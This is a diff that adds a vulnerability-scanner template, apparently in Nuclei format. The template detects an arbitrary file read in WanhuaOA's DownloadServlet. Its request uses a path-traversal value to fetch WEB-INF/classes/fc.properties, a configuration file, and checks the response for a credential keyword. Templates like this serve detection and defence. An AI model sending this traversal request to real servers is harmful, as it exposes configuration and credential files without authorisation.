@@ -1,0 +1,24 @@
+id: wanhuaoa-downloadservlet-lfi
+
+info:
+  name: WanhuaOA DownloadServlet Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an arbitrary file read vulnerability in WanhuaOA's DownloadServlet by checking for the presence of specific files and keywords in the response.
+  tags: lfi,file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ccerp.user"
